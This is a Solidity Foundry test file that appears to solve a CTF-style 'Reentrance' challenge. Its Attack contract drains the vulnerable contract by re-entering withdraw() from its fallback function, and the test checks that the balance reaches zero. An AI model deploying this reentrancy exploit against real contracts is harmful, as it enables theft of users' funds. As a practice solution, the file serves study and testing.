// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/10_Reentrancy.sol";

contract ReentranceTest is Test {
    Reentrance instance;
    Attack attacker;
    address player1;
    address player2;

    function setUp() public {
        player1 = vm.addr(1);
        vm.deal(player1, 10);

        player2 = vm.addr(21);
        vm.deal(player2, 3);
        vm.startPrank(player2);
        instance = new Reentrance();
        instance.donate{value: 3}(player2);
        vm.stopPrank();

        attacker = new Attack(payable(address(instance)));
    }

    function testattacker() public {
        vm.startPrank(player1);

        instance.donate{value: 10}(address(attacker));
        attacker.attack();
        assertEq(address(instance).balance, 0);

        vm.stopPrank();
    }
}

contract Attack is Test {
    Reentrance instance;

    constructor(address payable fb) payable {
        instance = Reentrance(fb);
    }

    function attack() public {
        instance.withdraw(10);
    }

    fallback() external payable {
        uint256 bal = address(instance).balance;
        if (bal > 0) {
            if (bal >= msg.value) {
                instance.withdraw(msg.value);
            } else {
                instance.withdraw(bal);
            }
        }
    }
}
